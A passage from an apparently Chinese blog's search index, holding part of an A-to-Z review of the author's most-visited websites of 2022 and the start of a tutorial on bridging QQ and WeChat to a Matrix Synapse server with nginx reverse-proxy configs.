\u7684\u6587\u7ae0\uff08\u672c\u4f53\u662f\u300a\u91cd\u6784\uff1a\u6539\u5584\u65e2\u6709\u4ee3\u7801\u7684\u8bbe\u8ba1\uff08\u7b2c\u4e8c\u7248\uff09\u300b\uff09\uff0c\u5b83\u8bb2\u4e86\u5f88\u591a\u5173\u4e8e\u91cd\u6784\u7684\u601d\u60f3\u548c\u539f\u7406\uff0c\u5e76\u4e14\u5bf9\u6211\u540e\u6765\u7684\u4ee3\u7801\u4ea7\u751f\u4e86\u6df1\u8fdc\u7684\u5f71\u54cd\u3002</p>"},{"location":"blog/2023/230113-my-2022-website/#l","title":"L","text":""},{"location":"blog/2023/230113-my-2022-website/#localhost8082","title":"localhost:8082","text":"<p>\u7b2c\u4e8c\u4e2a\u610f\u60f3\u4e0d\u5230\u7684\u7ed3\u679c\u3002\u5386\u53f2\u8bb0\u5f55\u663e\u793a\u7684\u540d\u79f0\u544a\u8bc9\u6211\uff0c\u8fd9\u4e2a\u7aef\u53e3\u88ab\u6211\u7528\u6765\u5728\u672c\u5730\u6d4b\u8bd5 mokabot2 \u6587\u6863\u3002</p>"},{"location":"blog/2023/230113-my-2022-website/#m","title":"M","text":""},{"location":"blog/2023/230113-my-2022-website/#myvultrcom","title":"my.vultr.com","text":"<p>Vultr \u7684\u63a7\u5236\u9762\u677f\u3002\u7531\u4e8e\u9700\u8981\u5bf9\u670d\u52a1\u5668\u7684\u6d41\u91cf\u8fdb\u884c\u7cbe\u786e\u52a8\u6001\u8c03\u63a7\uff0c\u6211\u4e0d\u5f97\u4e0d\u5e38\u5e38\u901a\u8fc7\u8fd9\u4e2a\u9875\u9762\u6765\u67e5\u770b\u670d\u52a1\u5668\u7684\u8fd0\u884c\u60c5\u51b5\u3002</p> <p>\u4e8b\u5b9e\u4e0a\uff0c\u6211\u7684\u4e24\u53f0\u670d\u52a1\u5668\u5747\u8d2d\u4e8e Vultr\u3002</p>"},{"location":"blog/2023/230113-my-2022-website/#n","title":"N","text":""},{"location":"blog/2023/230113-my-2022-website/#namesilocom","title":"namesilo.com","text":"<p>NameSilo\uff08\u6211\u4e00\u822c\u7b80\u79f0\u4e3a NMSL\uff09\uff0c\u662f\u4e00\u4e2a\u57df\u540d\u6ce8\u518c\u5546\uff0c\u8fd9\u662f\u4e3a\u6570\u4e0d\u591a\u7684\u652f\u6301 .moe \u9876\u7ea7\u57df\u540d\u7684\u6ce8\u518c\u5546\u4e4b\u4e00\u3002\u6211\u5728\u8fd9\u91cc\u6ce8\u518c\u4e86 arisa.moe \u8fd9\u4e2a\u57df\u540d\uff0c\u5e76\u4e14\u4ece \u6e56\u7cbe \u624b\u4e2d\u8f6c\u79fb\u5e76\u7eed\u8d39\u4e86 arcaea.moe \u8fd9\u4e2a\u57df\u540d\u3002</p>"},{"location":"blog/2023/230113-my-2022-website/#o","title":"O","text":""},{"location":"blog/2023/230113-my-2022-website/#odyseecom","title":"odysee.com","text":"<p>Odysee \u662f\u4e00\u4e2a\u53bb\u4e2d\u5fc3\u5316\u7684\u89c6\u9891\u7f51\u7ad9\uff0c\u5b83\u7684\u89c6\u9891\u5185\u5bb9\u662f\u7531\u7528\u6237\u4e0a\u4f20\u7684\uff0c\u4e0d\u8fc7\u66f4\u5e38\u89c1\u7684\u7528\u9014\u662f\uff0c\u7528\u5b83\u6765\u955c\u50cf YouTube \u7684\u89c6\u9891\u3002</p> <p>2022 \u4e00\u6574\u5e74\u6211\u90fd\u5728\u590d\u4e60\u8003\u7814\uff0c\u800c\u7f51\u8bfe\u662f\u5fc5\u4e0d\u53ef\u5c11\u7684\u3002\u5148\u524d\uff0c\u6211\u5728 YouTube \u89c2\u770b DayDayUp \u5206\u4eab\u7684\u7f51\u8bfe\uff0c\u4f46\u662f\u7531\u4e8e YouTube \u6839\u636e\u7248\u6743\u4e3b\u5f20\u5bf9 DayDayUp \u65d7\u4e0b\u7684\u82e5\u5e72\u4e2a\u9891\u9053\u8fdb\u884c\u4e86\u5c01\u7981\uff0c\u4ed6\u4eec\u4e0d\u5f97\u4e0d\u8f6c\u79fb\u5230 Odysee \u4e0a\u6765\u3002\u5728 2022 \u4e0b\u534a\u5e74\uff0c\u6211\u90fd\u662f\u5728\u8be5\u7f51\u7ad9\u4e0a\u89c2\u770b\u5269\u4f59\u7684\u7f51\u8bfe\u3002</p>"},{"location":"blog/2023/230113-my-2022-website/#p","title":"P","text":""},{"location":"blog/2023/230113-my-2022-website/#panbaiducom","title":"pan.baidu.com","text":"<p>\u8bf4\u660e\u5373\u4fbf\u662f\u6700\u6076\u5fc3\u7684\u7f51\u76d8\uff0c\u6211\u4e5f\u4e0d\u5f97\u4e0d\u53bb\u7528\u5b83\u3002\u4e0d\u8fc7\u6709\u5e78\u6211\u7684\u524d\u8f88\u5c06\u5979\u7684\u767e\u5ea6\u7f51\u76d8\u8d85\u7ea7\u4f1a\u5458\u8d26\u53f7\u5168\u6743\u5206\u4eab\u7ed9\u6211\u7528\uff0c\u8fd9\u6837\u6211\u5c31\u4e0d\u7528\u81ea\u5df1\u53bb\u4e70\u4e2a\u4f1a\u5458\u6765\u4e0b\u8f7d\u4e86\u3002</p>"},{"location":"blog/2023/230113-my-2022-website/#q","title":"Q","text":""},{"location":"blog/2023/230113-my-2022-website/#qiandaoarisamoe","title":"qiandao.arisa.moe","text":"<p>\u8fd9\u662f\u4e00\u4e2a\u81ea\u52a8\u7b7e\u5230\u7f51\u7ad9\uff0c\u901a\u8fc7\u6211\u7684\u670d\u52a1\u5668\u901a\u8fc7\u6a21\u62df\u767b\u5f55\u3001\u7b7e\u5230\u7b49\u64cd\u4f5c\uff0c\u81ea\u52a8\u66ff\u7528\u6237\u5b8c\u6210\u6bcf\u65e5\u7b7e\u5230\u3002\u5177\u4f53\u8be6\u89c1\u53e6\u4e00\u7bc7\u535a\u5ba2 \u81ea\u52a8\u7b7e\u5230\u4f7f\u7528\u6307\u5357\u3002</p>"},{"location":"blog/2023/230113-my-2022-website/#r","title":"R","text":""},{"location":"blog/2023/230113-my-2022-website/#runoobcom","title":"runoob.com","text":"<p>\u83dc\u9e1f\u6559\u7a0b\u662f\u6211\u7684\u7b2c\u4e00\u4e2a\u7cfb\u7edf\u5b66\u4e60\u7f16\u7a0b\u7684\u7f51\u7ad9\uff0c\u867d\u7136\u4ed6\u7684\u540d\u5b57\u91cc\u5e26\u6709\u83dc\u9e1f\uff0c\u4f46\u5e76\u4e0d\u610f\u5473\u7740\u5b83\u7684\u5185\u5bb9\u662f\u5355\u7eaf\u9762\u5411\u83dc\u9e1f\u7684\u3002</p> <p>\u9664\u4e86\u80fd\u5728\u8fd9\u91cc\u5b66\u4e60\u5404\u79cd\u4e0d\u540c\u7684\u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00\u4e4b\u5916\uff0c\u8fd9\u4e2a\u7f51\u7ad9\u8fd8\u53ef\u4ee5\u5728\u67d0\u79cd\u7a0b\u5ea6\u4e0a\u66ff\u4ee3\u5b98\u65b9\u6587\u6863\uff0c\u5b83\u4ee5\u4f7f\u7528\u8005\u7684\u89c6\u89d2\u4ecb\u7ecd\u4e86\u4e00\u4e9b\u5e93\u7684\u4f7f\u7528\uff0c\u5e76\u4e14\u63d0\u4f9b\u4e86\u4e00\u4e9b\u5b9e\u4f8b\u4ee3\u7801\uff0c\u540c\u65f6\u8fd8\u8bb2\u4e86\u4e00\u4e9b\u5751\u3002\u5b83\u751a\u81f3\u6709\u591a\u4e2a\u5728\u7ebf\u8fd0\u884c\u73af\u5883\uff0c\u53ef\u4ee5\u8ba9\u4f60\u5728\u7f51\u9875\u4e0a\u76f4\u63a5\u7f16\u5199\u4ee3\u7801\u5e76\u8fd0\u884c\u3002</p>"},{"location":"blog/2023/230113-my-2022-website/#s","title":"S","text":""},{"location":"blog/2023/230113-my-2022-website/#sharearisamoe","title":"share.arisa.moe","text":"<p>Arisa \u7684\u6587\u4ef6\u5206\u4eab\u7ad9\u3002\u8fd9\u4e2a\u7f51\u7ad9\u662f\u901a\u8fc7 PanIndex \u642d\u5efa\u800c\u6210\u7684\uff0c\u88ab\u6211\u7528\u6765\u5206\u4eab\u6211\u963f\u91cc\u4e91\u76d8\u4e2d\u7684\u6587\u4ef6\uff0c\u5e76\u8fdb\u884c\u7b80\u5355\u5730\u5206\u53d1\u3002</p>"},{"location":"blog/2023/230113-my-2022-website/#t","title":"T","text":""},{"location":"blog/2023/230113-my-2022-website/#twittercom","title":"twitter.com","text":"<p>\u5982\u4eca\u63a8\u7279\u5df2\u7ecf\u53d8\u6210\u4e86\u9a6c\u65af\u514b\u7684\u5929\u4e0b\u4e86\uff0c\u4f46\u662f\u6211\u8fd8\u662f\u4f1a\u7ecf\u5e38\u4e0a\u53bb\u770b\u770b\u3002\u7531\u4e8e\u6211\u7684\u63a8\u7279\u8d26\u53f7\u88ab\u5c01\u7981\u800c\u4e14\u6211\u4e5f\u4e0d\u60f3\u518d\u53bb\u7533\u8bc9\uff0c\u6240\u4ee5\u63a8\u7279\u5bf9\u6211\u800c\u8a00\u76ee\u524d\u53ea\u662f\u4e00\u4e2a\u53ea\u8bfb\u7684\u5b58\u5728\u3002</p>"},{"location":"blog/2023/230113-my-2022-website/#u","title":"U","text":""},{"location":"blog/2023/230113-my-2022-website/#ucdrssuperlibnet","title":"ucdrs.superlib.net","text":"<p>\u5bf9\u6211\u800c\u8a00\u8fd9\u662f\u4e00\u4e2a\u5b8c\u5168\u964c\u751f\u7684\u57df\u540d\uff0c\u76f4\u5230\u6211\u6253\u5f00\u4e86\u5b83\uff0c\u53d1\u73b0\u5b83\u7684\u540d\u5b57\u662f\u5168\u56fd\u56fe\u4e66\u9986\u53c2\u8003\u54a8\u8be2\u8054\u76df\u3002</p> <p>\u539f\u6765\u8fd9\u662f\u4e2a\u7535\u5b50\u4e66\u7d22\u5f15\u7f51\u7ad9\uff0c\u90a3\u6211\u60f3\u8d77\u6765\u4e86\uff0c\u5728\u8003\u7814\u5907\u8003\u65f6\u671f\uff0c\u4e3a\u4e86\u7701\u94b1\uff0c\u5e38\u5e38\u5728\u6dd8\u5b9d\u4e0a\u8d2d\u4e70\u7535\u5b50\u4e66\uff0c\u5356\u5bb6\u7684\u4e66\u901a\u5e38\u90fd\u662f\u901a\u8fc7\u8fd9\u4e2a\u7f51\u7ad9\u8fdb\u884c\u68c0\u7d22\u7684\u3002</p>"},{"location":"blog/2023/230113-my-2022-website/#v","title":"V","text":""},{"location":"blog/2023/230113-my-2022-website/#vndborg","title":"vndb.org","text":"<p>The Visual Novel Database\uff0c\u4e00\u4e2a\u5927\u578b\u89c6\u89c9\u5c0f\u8bf4\u6570\u636e\u5e93\uff0c\u7531\u793e\u533a\u8fdb\u884c\u7ef4\u62a4\u3002\u4f60\u53ef\u4ee5\u5728\u6b64\u67e5\u8be2\u4efb\u4f55\u4e00\u4e2a\u89c6\u89c9\u5c0f\u8bf4\u7684\u6570\u636e\uff0c\u9664\u540d\u79f0\u3001\u522b\u540d\u3001\u5f00\u53d1\u8005\u3001\u53d1\u884c\u8005\u7b49\u57fa\u672c\u4fe1\u606f\u5916\uff0c\u8fd8\u5305\u62ec\u89c6\u89c9\u5c0f\u8bf4\u7684\u76f8\u5173\u5173\u7cfb\u3001Staff \u5217\u8868\u3001\u89d2\u8272\u6458\u8981\u3001\u57fa\u4e8e\u8d1d\u53f6\u65af\u7b97\u6cd5\u7684\u7528\u6237\u8bc4\u5206\u7b49\u3002\u4f60\u751a\u81f3\u80fd\u5728\u8fd9\u91cc\u67e5\u91cc\u754c\u58f0\u4f18\u9a6c\u7532\uff0c\u8fd8\u80fd\u58f0\u4f18\u53cd\u67e5\u4f5c\u54c1\uff0c\u4ee5\u53ca\u6570\u636e\u5e93\u7528\u6237\u5bf9\u89c6\u89c9\u5c0f\u8bf4\u6e38\u73a9\u65f6\u95f4\u7684\u7edf\u8ba1\u3002</p> <p>\u901a\u8fc7 VNDB\uff0c\u53ef\u4ee5\u5f88\u5bb9\u6613\u3001\u540c\u65f6\u4e5f\u5f88\u5168\u9762\u5730\u638c\u63e1\u4e00\u4e2a\u89c6\u89c9\u5c0f\u8bf4\u7684\u5168\u90e8\u4fe1\u606f\uff0c\u800c\u4e0d\u5fc5\u8fd9\u91cc\u95ee\u4e00\u95ee\u90a3\u91cc\u67e5\u4e00\u67e5\u3002</p>"},{"location":"blog/2023/230113-my-2022-website/#w","title":"W","text":""},{"location":"blog/2023/230113-my-2022-website/#wwwgooglecom","title":"www.google.com","text":"<p>Google \u4f5c\u4e3a\u6211\u7684\u9ed8\u8ba4\u641c\u7d22\u5f15\u64ce\uff0c\u4ece\u5404\u4e2a\u65b9\u9762\u540a\u6253\u767e\u5ea6\uff0c\u9664\u4e86\u4e2d\u6587\u5185\u5bb9\u519c\u573a\u3002</p>"},{"location":"blog/2023/230113-my-2022-website/#x","title":"X","text":""},{"location":"blog/2023/230113-my-2022-website/#xtlsgithubio","title":"xtls.github.io","text":"<p>Project X\uff0c\u6216\u8005 Xray\uff0c\u4e00\u4e2a\u652f\u6301\u591a\u534f\u8bae\u7684\u4ee3\u7406\u7a0b\u5e8f\u3002\u53ef\u662f\u4e3a\u4ec0\u4e48\u6211\u4e00\u4e2a Trojan-Go \u7528\u6237\u4f1a\u9700\u8981\u7528\u5230\u8fd9\u4e2a\u7f51\u7ad9\u5462\uff08\u8ff7\u60d1\uff09\u3002</p>"},{"location":"blog/2023/230113-my-2022-website/#y","title":"Y","text":""},{"location":"blog/2023/230113-my-2022-website/#youtubecom","title":"youtube.com","text":"<p>\u6ca1\u9519\uff0c\u4e16\u754c\u4e0a\u6700\u5927\u7684\u89c6\u9891\u7f51\u7ad9\uff0c\u5728\u6211\u65e5\u5e38\u4f7f\u7528\u4e2d\u7684\u5730\u4f4d\u5df2\u7ecf\u8fdc\u8d85 bilibili\uff08B \u7ad9\u662f\u6211\u4f7f\u7528\u9891\u7387\u7b2c\u4e8c\u7684\u89c6\u9891\u7f51\u7ad9\uff09\u3002\u4e4b\u6240\u4ee5\u66f4\u559c\u6b22\u770b YouTube\uff0c\u662f\u56e0\u4e3a YouTube \u4e0a\u7684\u4f18\u79c0\u5185\u5bb9\u521b\u4f5c\u8005\u66f4\u591a\uff08\u76f8\u5bf9\u7684\u5feb\u9910\u89c6\u9891\u4e0e\u70ed\u5ea6\u89c6\u9891\u66f4\u5c11\uff09\uff0c\u89c6\u9891\u5185\u5bb9\u53d7\u9650\u7a0b\u5ea6\u4e5f\u66f4\u5c11\uff08\u76f8\u5bf9\u7684\u7248\u6743\u9650\u5236\u66f4\u591a\uff09\uff0c\u800c\u4e14\u5b83\u7684\u63a8\u8350\u7b97\u6cd5\u66f4\u5bb9\u6613\u627e\u5230\u81ea\u5df1\u771f\u6b63\u559c\u6b22\u7684\u5185\u5bb9\uff0c\u800c\u4e0d\u662f\u88ab\u7b97\u6cd5\u201c\u5582\u201d\u5185\u5bb9\u3002</p> <p>\u5176\u5b9e\u66f4\u91cd\u8981\u7684\u539f\u56e0\u662f YouTube \u4e0a\u80fd\u770b\u66f4\u591a\u7684 vtuber\uff0cB \u7ad9\u53ea\u80fd\u7b49\u8f6c\u64ad</p>"},{"location":"blog/2023/230113-my-2022-website/#z","title":"Z","text":""},{"location":"blog/2023/230113-my-2022-website/#zhuanlanzhihucom","title":"zhuanlan.zhihu.com","text":"<p>Z \u5c45\u7136\u662f\u77e5\u4e4e\u4e13\u680f\uff0c\u8bf4\u660e\u6211\u5728 2022 \u5e74\u7684\u7684\u786e\u786e\u770b\u4e86\u5f88\u591a\u77e5\u4e4e\u4e13\u680f\u3002</p>"},{"location":"blog/2023/230114-matrix-qq-wechat-bridge/","title":"\u901a\u8fc7 Matrix \u534f\u8bae\u5b9e\u73b0\u4ee3\u7406\u63a5\u6536 QQ \u548c\u5fae\u4fe1\u6d88\u606f \u2014\u2014 \u4ece\u5165\u5751\u5230\u5165\u571f","text":"","tags":["matrix","qq","wechat","cloudflare","cloudflare-workers","nginx"]},{"location":"blog/2023/230114-matrix-qq-wechat-bridge/#_1","title":"\u4e00\u3001\u7eea\u8bba","text":"<p>QQ \u4e0e\u5fae\u4fe1\u5ba2\u6237\u7aef\u5728\u5404\u4e2a\u5e73\u53f0\u4e0a\u5747\u5b58\u5728\u4e0d\u540c\u7a0b\u5ea6\u4e0a\u7684\u4f5c\u6076\u884c\u4e3a\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1a\u540e\u53f0\u5e38\u9a7b\u4fdd\u6d3b\u3001\u5360\u7528\u5927\u91cf\u5b58\u50a8\u7a7a\u95f4\u3001\u8fdc\u7a0b\u804a\u5929\u8bb0\u5f55\u7ba1\u7406\u4e0d\u5584\u7b49\uff0c\u4e0e\u4e4b\u5f62\u6210\u5f3a\u70c8\u53cd\u5dee\u7684\u662f Telegram \u5ba2\u6237\u7aef\u3002\u6211\u4eec\u6025\u5207\u9700\u8981\u4e00\u4e2a\u50cf Telegram \u4e00\u6837\u53cb\u597d\u7684\u5de5\u5177\u6765\u4ee3\u7406\u63a5\u6536\u548c\u53d1\u9001 QQ \u548c\u5fae\u4fe1\u6d88\u606f\u3002</p> <p>\u76ee\u524d\uff0cQQ \u548c\u5fae\u4fe1\u65e9\u5c31\u6709\u4e86\u5b8c\u5584\u7684 Bot \u652f\u6301\uff0c\u4f8b\u5982 go-cqhttp \u548c ComWeChatRobot\u3002\u90a3\u4e48\u6709\u6ca1\u6709\u4e00\u79cd\u53ef\u80fd\uff0c\u6211\u4eec\u5bfb\u627e\uff08\u751a\u81f3\u8bbe\u8ba1\uff09\u4e00\u4e2a\u5ba2\u6237-\u670d\u52a1\u7aef\uff0c\u5c06\u670d\u52a1\u7aef\u90e8\u7f72\u4e8e VPS \u4e0a\u8fd0\u884c Bot \u7a0b\u5e8f\u4ece\u800c\u63a5\u6536\u6765\u81ea QQ \u548c\u5fae\u4fe1\u7684\u6d88\u606f\uff0c\u5e76\u5728\u7ec8\u7aef\u8bbe\u5907\u4e0a\u8fd0\u884c\u66f4\u53cb\u597d\u7684\u5ba2\u6237\u7aef\u5462\uff1f</p> <p>\u4e8b\u5b9e\u4e0a\uff0c\u6211\u4eec\u65e0\u9700\u8bbe\u8ba1\uff0c\u8fd9\u4e2a\u601d\u8def\u65e9\u5c31\u6709\u524d\u4eba\u5b9e\u8df5\u8fc7\u4e86\u3002\u8fd9\u4e2a\u670d\u52a1\u7aef\u5c31\u662f Synapse\uff08\u53c8\u88ab\u79f0\u4e3a Matrix homeserver\uff09\uff0c\u8fd9\u4e2a\u5ba2\u6237\u7aef\u5c31\u662f Element\uff08\u5168\u5e73\u53f0\u652f\u6301\uff09\uff0c\u4ed6\u4eec\u4e4b\u95f4\u901a\u8fc7 Matrix \u534f\u8bae\u8fdb\u884c\u901a\u4fe1\uff08\u4ee5\u4e0b\u5c06\u8be5\u65b9\u6848\u7b80\u79f0\u4e3a <code>bridge \u8f6c\u53d1\u65b9\u6848</code>\uff09</p> <p>\u672c\u6587\u4e3b\u8981\u4ecb\u7ecd\u4e86\u5982\u4f55\u901a\u8fc7 bridge \u8f6c\u53d1\u65b9\u6848\u5b9e\u73b0\u4ee3\u7406\u63a5\u6536 QQ \u548c\u5fae\u4fe1\u6d88\u606f\uff0c\u4ee5\u53ca\u4e09\u4e2a\u6708\u540e\u6211\u4e3a\u4ec0\u4e48\u6700\u7ec8\u653e\u5f03\u4e86\u5b83\u3002</p> <p>\u672c\u6587\u5047\u5b9a\u8bfb\u8005\u5df2\u7ecf\u4e86\u89e3 Matrix \u534f\u8bae\uff0c\u5982\u679c\u4e0d\u4e86\u89e3\uff0c\u53ef\u4ee5\u53c2\u8003 Matrix \u534f\u8bae\u7b80\u4ecb\u3002</p>","tags":["matrix","qq","wechat","cloudflare","cloudflare-workers","nginx"]},{"location":"blog/2023/230114-matrix-qq-wechat-bridge/#_2","title":"\u4e8c\u3001\u5165\u5751","text":"","tags":["matrix","qq","wechat","cloudflare","cloudflare-workers","nginx"]},{"location":"blog/2023/230114-matrix-qq-wechat-bridge/#21","title":"2.1 \u670d\u52a1\u7aef\u4e0e\u670d\u52a1\u7aef\u7684\u5751","text":"<p>\u5173\u4e8e\u670d\u52a1\u7aef\u7684\u90e8\u7f72\uff0c\u53ef\u76f4\u63a5\u53c2\u9605 Duo \u7684\u8fd9\u7bc7\u535a\u5ba2\uff1aMatrix, QQ and Wechat</p> <p>\u6309\u7167\u4e0a\u8ff0\u535a\u5ba2\u90e8\u7f72\u670d\u52a1\u7aef\u65f6\u4f1a\u9047\u5230\u5f88\u591a\u95ee\u9898\uff08\u4f8b\u5982\u91c7\u7528 nginx \u65f6\u5f88\u591a\u5730\u65b9\u5747\u4e0e\u6559\u7a0b\u6709\u51fa\u5165\uff09\uff0c\u73b0\u603b\u7ed3\u5982\u4e0b\uff1a</p>","tags":["matrix","qq","wechat","cloudflare","cloudflare-workers","nginx"]},{"location":"blog/2023/230114-matrix-qq-wechat-bridge/#80-nginx","title":"\u5173\u4e8e\u5bbf\u4e3b 80 \u88ab nginx \u5360\u7528\u65f6\u7684\u89e3\u51b3\u65b9\u6cd5","text":"<p>\u6211\u4e3b\u673a\u4e0a\u7684 443 \u7aef\u53e3\u88ab trojan-go \u5360\u7528\uff0c\u4f1a\u81ea\u52a8\u5c06 443 \u7684\u6240\u6709\u7684 https \u8bf7\u6c42\u89e3\u5bc6\u4e3a http \u4f20\u9012\u5230 nginx\uff0c\u56e0\u6b64\u53ea\u9700\u8981\u6539 80 \u7aef\u53e3\u5373\u53ef\u3002\u5176\u4ed6\u60c5\u51b5\u53ef\u7c7b\u6bd4\u53c2\u8003\u3002</p> <p>\u6240\u4f5c\u7684\u4e8b\u5c31\u662f\u5c06\u6240\u6709\u6765\u81ea <code>matrix.example.com</code> \u7684\u6d88\u606f\u8f6c\u53d1\u5230\u5bb9\u5668\u5185\u7684 <code>8008</code> \u7aef\u53e3\u3002</p> <p>\u4e0d\u521b\u5efa Caddy \u5bb9\u5668\uff0c\u800c\u662f\u5728 <code>docker-compose.yml</code> \u7684 <code>synapse</code> \u4e2d\u52a0\u5165\u7aef\u53e3\u6620\u5c04\uff1a</p> <pre><code>ports:\n- 127.0.0.1:8082:8008\n</code></pre> <p>\u7136\u540e\u5728\u5bbf\u4e3b\u7684 nginx \u4e0a\u52a0\u5165 <code>80</code> \u7aef\u53e3\u5230 <code>8082</code> \u7684\u53cd\u4ee3</p> <pre><code>server {\nlisten 80;\nlisten [::]:80;\nserver_name matrix.example.com;\n\n# \u53cd\u4ee3\u5230 synapse\nlocation / {\nproxy_set_header Host $host;\nproxy_set_header X-Real-IP $remote_addr;\nproxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\nproxy_pass http://127.0.0.1:8082;\n}\n}\n</code></pre> <p>\u6ce8\u610f</p> <p>\u5982\u679c\u4f60\u7684 bridge \u662f\u5fae\u4fe1\uff0c\u90a3\u4e48\u8fd9\u8fd8\u6ca1\u5b8c\uff08\u89c1\u540e\u9762\u5173\u4e8e\u53cd\u4ee3 agent \u7684\u8865\u5145\uff09\u3002</p>","tags":["matrix","qq","wechat","cloudflare","cloudflare-workers","nginx"]},{"location":"blog/2023/230114-matrix-qq-wechat-bridge/#cloudflare-cdn","title":"\u4f7f\u7528 Cloudflare CDN \u65f6\u7684\u60c5\u51b5","text":"<p>\u900f\u8fc7 CDN \u65f6\uff0c\u4f7f\u7528 Matrix Federation Tester \u4f1a\u81ea\u7136\u68c0\u6d4b\u5931\u8d25\uff0c\u56e0\u4e3a\u5b83\u901a\u8fc7 DNS \u67e5\u8be2\u4e4b\u540e\u5c1d\u8bd5\u7528 IP \u8fde\u63a5\uff0c\u8fd9\u663e\u7136\u662f\u6ca1\u6cd5\u900f\u8fc7 CDN \u7684\u3002</p> <p>\u6b64\u65f6\u53ef\u4ee5\u8bbf\u95ee https://matrix.example.com/_matrix/federation/v1/version \u6216\u901a\u8fc7 https://app.element.io \u6765\u6d4b\u8bd5\u53ef\u7528\u6027\u3002</p>","tags":["matrix","qq","wechat","cloudflare","cloudflare-workers","nginx"]},{"location":"blog/2023/230114-matrix-qq-wechat-bridge/#bot-qq-wechat","title":"\u4f7f\u4e24\u4e2a bot \u81ea\u52a8\u521b\u5efa QQ \u548c WeChat \u7a7a\u95f4\u4ee5\u533a\u5206\u4e0d\u540c\u6765\u6e90\u7684\u6d88\u606f","text":"<p>\u5206\u522b\u5728 QQ \u548c WeChat \u7684\u4e24\u4e2a <code>config.yaml</code> \u4e2d\u4fee\u6539\uff1a</p> <pre><code>personal_filtering_spaces: true\n</code></pre> <p>\u5982\u679c\u4f60\u5df2\u7ecf\u6765\u665a\u4e86\uff08\u5373\uff1a\u6709\u4e9b\u804a\u5929\u623f\u95f4\u5df2\u7ecf\u5904\u5728 Space \u5916\u9762\uff09\uff0c\u90a3\u4e48\u5728 Bot \u4e2d\u6267\u884c <code>sync space</code> \u5373\u53ef\u3002</p>","tags":["matrix","qq","wechat","cloudflare","cloudflare-workers","nginx"]},{"location":"blog/2023/230114-matrix-qq-wechat-bridge/#_3","title":"\u81ea\u52a8\u6e05\u9664\u670d\u52a1\u7aef\u5a92\u4f53\u6587\u4ef6\u4ee5\u514d\u670d\u52a1\u5668\u786c\u76d8\u6ee1","text":"<p><code>homeserver.yaml</code> \u4e2d\u52a0\u5165\uff1a</p> <pre><code>media_retention:\nlocal_media_lifetime: 3d\nremote_media_lifetime: 14d\n</code></pre> <p>\u6700\u4e3b\u8981\u7684\u5bb9\u91cf\u5360\u7528\u6765\u81ea <code>local_xxxxx</code>\uff0cbridge \u4f1a\u81ea\u52a8\u4e0b\u8f7d QQ/WeChat \u4e0a\u7684\u6240\u6709\u5a92\u4f53\u5230\u8fd9\u4e2a\u6587\u4ef6\u5939\u91cc\uff0c\u6211\u8bbe\u7f6e\u7684\u662f\u6700\u591a\u4fdd\u7559 3 \u5929\uff0c\u5177\u4f53\u5404\u4f4d\u7ed3\u5408\u81ea\u5df1\u5b9e\u9645\u60c5\u51b5\u6539\u3002</p>","tags":["matrix","qq","wechat","cloudflare","cloudflare-workers","nginx"]},{"location":"blog/2023/230114-matrix-qq-wechat-bridge/#xxx-mb","title":"\u53d1\u9001\u5a92\u4f53\u6587\u4ef6\u5927\u4e8e XXX MB \u65f6\u53d1\u9001\u5931\u8d25","text":"<ol> <li> <p><code>max_upload_size</code> \u503c\u7684\u95ee\u9898</p> <p><code>homeserver.yaml</code> \u4e2d\u4fee\u6539\u8bbe\u7f6e\uff1a</p> <pre><code>max_upload_size: 50M\n</code></pre> <p>\u8fd9\u4e2a\u503c\u5982\u679c\u6ca1\u6709\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u5b9a\u4e49\uff0c\u90a3\u9ed8\u8ba4\u662f 50M\u3002</p> </li> <li> <p>\u53cd\u4ee3\u7684\u95ee\u9898</p> <p>\u53c2\u8003 Using a reverse proxy with Synapse</p> <p>\u4ee5 nginx \u4e3a\u4f8b\uff0c\u5c06\u5bf9\u5e94\u7684 <code>location</code> \u52a0\u5165\u4ee5\u4e0b\u4e24\u53e5\uff1a</p> <pre><code>client_max_body_size 50M;\nproxy_http_version 1.1;\n</code></pre> <p>nginx \u9ed8\u8ba4\u7684 <code>client_max_body_size</code> \u5f88\u5c0f\uff0c\u4e0d\u8db3\u4ee5\u63a5\u6536\u6216\u53d1\u9001\u5927\u578b\u5a92\u4f53</p> </li> </ol>","tags":["matrix","qq","wechat","cloudflare","cloudflare-workers","nginx"]},{"location":"blog/2023/230114-matrix-qq-wechat-bridge/#nginx-matrix-wechat-agent","title":"nginx \u53cd\u4ee3 matrix-wechat-agent","text":"<p>\u6240\u4f5c\u7684\u4e8b\u5c31\u662f\u5c06\u6240\u6709\u6765\u81ea <code>matrix.example.com/_wechat</code> \u7684\u6d88\u606f\u8f6c\u53d1\u5230\u5bb9\u5668\u5185\u7684 <code>20002</code> \u7aef\u53e3\u3002</p> <p>\u540c\u4e0a\uff0c\u5728 <code>docker-compose.yml</code> \u7684 <code>synapse</code> \u4e2d\u52a0\u5165\u7aef\u53e3\u6620\u5c04\uff1a</p> <pre><code>ports:\n- 127.0.0.1:8083:20002\n</code></pre> <p>\u6ce8\u610f\uff1a<code>matrix-wechat-agent</code> \u4f7f\u7528 WebSocket \u8fdb\u884c\u5de5\u4f5c\uff0cnginx \u53cd\u4ee3\u65f6\u548c http \u53cd\u4ee3\u914d\u7f6e\u7a0d\u6709\u4e0d\u540c\uff1a</p> <pre><code>location /_wechat {\nproxy_http_version 1.1;\nproxy_set_header Upgrade $http_upgrade;\nproxy_set_header Connection \"upgrade\";\nproxy_set_header Host $host;\nproxy_set_header X-Real-IP $remote_addr;\nproxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\nproxy_pass http://127.0.0.1:8083;\n}\n</code></pre>","tags":["matrix","qq","wechat","cloudflare","cloudflare-workers","nginx"]},{"location":"blog/2023/230114-matrix-qq-wechat-bridge/#matrix-wechat-agent","title":"\u90e8\u7f72 <code>matrix-wechat-agent</code>","text":"<p>\u9996\u5148\uff0c\u4ece <code>matrix-wechat/config.yaml</code> \u91cc\u627e\u5230 <code>listen_secret</code> \u7684\u503c\u5e76\u8bb0\u5f55\u3002</p> <p>\u7136\u540e\u53bb duo/matrix-wechat-agent \u4e0b\u8f7d <code>matrix-wechat-agent.exe</code>\u3002</p> <p>\u63a5\u4e0b\u6765\uff0c\u4ece ljc545w/ComWeChatRobot \u5904\u4e0b\u8f7d\u5fc5\u8981\u7684 dll \u6587\u4ef6\uff0c\u5e76\u653e\u5728 <code>matrix-wechat-agent.exe</code> \u540c\u76ee\u5f55\u4e0b\u3002</p> 